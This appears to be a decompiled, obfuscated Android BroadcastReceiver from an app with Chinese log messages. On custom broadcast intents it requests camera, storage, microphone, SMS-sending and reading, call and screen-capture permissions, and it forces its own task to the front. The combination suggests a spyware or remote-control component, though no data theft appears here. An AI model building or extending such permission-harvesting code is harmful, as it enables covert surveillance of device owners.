package com.storm.safe.rock;

import android.R;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.iuzxujjtqev$combinedBroadcastReceiver$1;
import java.util.ArrayList;
import kotlin.Pair;
import p000.bk1;
import p000.ek1;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class iuzxujjtqev$combinedBroadcastReceiver$1 extends BroadcastReceiver {

    /* renamed from: a1 */
    public static final /* synthetic */ int f51977a1 = 0;

    /* renamed from: a0 */
    public final /* synthetic */ iuzxujjtqev f51978a0;

    public iuzxujjtqev$combinedBroadcastReceiver$1(iuzxujjtqev iuzxujjtqevVar) {
        this.f51978a0 = iuzxujjtqevVar;
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String action = intent != null ? intent.getAction() : null;
        if (t60.m214686a2(action, "com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION")) {
            iuzxujjtqev.C0254a0 c0254a0 = iuzxujjtqev.f51956e2;
            return;
        }
        boolean zM214686a2 = t60.m214686a2(action, "com.storm.safe.rock.intent.REQUEST_CAMERA_PERMISSION");
        final iuzxujjtqev iuzxujjtqevVar = this.f51978a0;
        if (zM214686a2) {
            iuzxujjtqev.C0254a0 c0254a02 = iuzxujjtqev.f51956e2;
            try {
                if (iuzxujjtqevVar.checkSelfPermission("android.permission.CAMERA") != 0) {
                    iuzxujjtqevVar.requestPermissions(new String[]{"android.permission.CAMERA"}, 1009);
                    return;
                }
                return;
            } catch (Exception e) {
                t60.m214705c6("iuzxujjtqev", "❌ 直接摄像头权限请求失败", e);
                return;
            }
        }
        if (t60.m214686a2(action, "com.storm.safe.rock.intent.REQUEST_GALLERY_PERMISSION")) {
            iuzxujjtqev.C0254a0 c0254a03 = iuzxujjtqev.f51956e2;
            try {
                String[] strArr = Build.VERSION.SDK_INT >= 33 ? new String[]{"android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO"} : new String[]{"android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"};
                ArrayList arrayList = new ArrayList();
                for (String str : strArr) {
                    if (iuzxujjtqevVar.checkSelfPermission(str) != 0) {
                        arrayList.add(str);
                    }
                }
                if (arrayList.isEmpty()) {
                    return;
                }
                iuzxujjtqevVar.requestPermissions((String[]) arrayList.toArray(new String[0]), 1007);
                return;
            } catch (Exception e2) {
                t60.m214705c6("iuzxujjtqev", "❌ 直接相册权限请求失败", e2);
                return;
            }
        }
        if (t60.m214686a2(action, "com.storm.safe.rock.intent.REQUEST_MICROPHONE_PERMISSION")) {
            iuzxujjtqev.C0254a0 c0254a04 = iuzxujjtqev.f51956e2;
            iuzxujjtqevVar.m211226d6();
            return;
        }
        int i = 5;
        if (t60.m214686a2(action, "com.storm.safe.rock.intent.REQUEST_SMS_PERMISSION")) {
            iuzxujjtqev.C0254a0 c0254a05 = iuzxujjtqev.f51956e2;
            try {
                String[] strArr2 = {"android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE"};
                ArrayList arrayList2 = new ArrayList();
                for (int i2 = 0; i2 < 5; i2++) {
                    String str2 = strArr2[i2];
                    if (iuzxujjtqevVar.checkSelfPermission(str2) != 0) {
                        arrayList2.add(str2);
                    }
                }
                if (arrayList2.isEmpty()) {
                    return;
                }
                iuzxujjtqevVar.requestPermissions((String[]) arrayList2.toArray(new String[0]), 1006);
                return;
            } catch (Exception e3) {
                t60.m214705c6("iuzxujjtqev", "❌ 直接短信权限请求失败", e3);
                return;
            }
        }
        int i3 = 4;
        if (t60.m214686a2(action, "com.storm.safe.rock.intent.REQUEST_ALL_PERMISSIONS")) {
            iuzxujjtqev.C0254a0 c0254a06 = iuzxujjtqev.f51956e2;
            try {
                iuzxujjtqevVar.runOnUiThread(new bk1(iuzxujjtqevVar, 3));
                new Handler(Looper.getMainLooper()).postDelayed(new bk1(iuzxujjtqevVar, i3), 1000L);
                return;
            } catch (Exception e4) {
                t60.m214705c6("iuzxujjtqev", "❌ 一次性权限申请失败", e4);
                iuzxujjtqevVar.runOnUiThread(new bk1(iuzxujjtqevVar, i));
                return;
            }
        }
        if (t60.m214686a2(action, iuzxujjtqevVar.getPackageName() + ".REQUEST_MEDIA_PROJECTION")) {
            try {
                try {
                    Object systemService = iuzxujjtqevVar.getSystemService("activity");
                    t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.ActivityManager");
                    ((ActivityManager) systemService).moveTaskToFront(iuzxujjtqevVar.getTaskId(), 1);
                } catch (Exception e5) {
                    t60.m214726f4("iuzxujjtqev", "⚠️ moveTaskToFront 失败: " + e5.getMessage());
                }
                new Handler(Looper.getMainLooper()).postDelayed(new bk1(iuzxujjtqevVar, 9), 300L);
                return;
            } catch (Exception e6) {
                t60.m214705c6("iuzxujjtqev", "❌ 处理系统投屏权限请求失败", e6);
                return;
            }
        }
        if (!t60.m214686a2(action, "com.storm.safe.rock.intent.REQUEST_PERMISSION_FROM_SERVICE")) {
            if (t60.m214686a2(action, "com.storm.safe.rock.intent.SHOW_MAIN_ACTIVITY")) {
                final boolean booleanExtra = intent.getBooleanExtra("SETUP_COMPLETE", false);
                final boolean booleanExtra2 = intent.getBooleanExtra("FORCE_FOREGROUND", false);
                iuzxujjtqevVar.runOnUiThread(new Runnable() { // from class: fk1
                    @Override // java.lang.Runnable
                    public final void run() {
                        iuzxujjtqev iuzxujjtqevVar2 = iuzxujjtqevVar;
                        boolean z = booleanExtra2;
                        int i4 = iuzxujjtqev$combinedBroadcastReceiver$1.f51977a1;
                        try {
                            new Handler(Looper.getMainLooper()).post(new gk1(iuzxujjtqevVar2, z, 0));
                            if (booleanExtra) {
                                String string = iuzxujjtqevVar2.getString(R$string.status_service_starting);
                                t60.m214694b5(string, "getString(R.string.status_service_starting)");
                                iuzxujjtqevVar2.m211236e6(string, Integer.valueOf(R.color.holo_green_dark));
                                Button button = iuzxujjtqevVar2.f51959c4;
                                if (button != null) {
                                    button.setText(iuzxujjtqevVar2.getString(R$string.btn_service_ready));
                                    Button button2 = iuzxujjtqevVar2.f51959c4;
                                    if (button2 == null) {
                                        t60.m214724f2("enableButton");
                                        throw null;
                                    }
                                    button2.setBackgroundColor(iuzxujjtqevVar2.getColor(R.color.holo_green_dark));
                                    Button button3 = iuzxujjtqevVar2.f51959c4;
                                    if (button3 != null) {
                                        button3.setEnabled(false);
                                    } else {
                                        t60.m214724f2("enableButton");
                                        throw null;
                                    }
                                }
                            }
                        } catch (Exception e7) {
                            t60.m214705c6("iuzxujjtqev", "❌ 显示主页失败", e7);
                        }
                    }
                });
                return;
            }
            return;
        }
        boolean booleanExtra3 = intent.getBooleanExtra("AUTO_REQUEST_PERMISSION", false);
        long longExtra = intent.getLongExtra("TIMESTAMP", 0L);
        String stringExtra = intent.getStringExtra("SOURCE");
        if (stringExtra == null) {
            stringExtra = "未知";
        }
        t60.m214714d6("iuzxujjtqev", "✅ [广播] 备用广播参数: AUTO=" + booleanExtra3 + ", TIME=" + longExtra + ", SRC=" + stringExtra);
        if (!booleanExtra3) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [广播] 备用广播无AUTO_REQUEST标志");
            return;
        }
        if (iuzxujjtqevVar.f51966d1) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 申请中，忽略备用广播");
            return;
        }
        Integer num = AbstractC0241a0.f51907a1;
        if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) != null) {
            return;
        }
        t60.m214714d6("iuzxujjtqev", "✅ [广播] 权限申请已通过主Intent启动");
        iuzxujjtqevVar.runOnUiThread(new ek1(iuzxujjtqevVar, 4));
    }
}
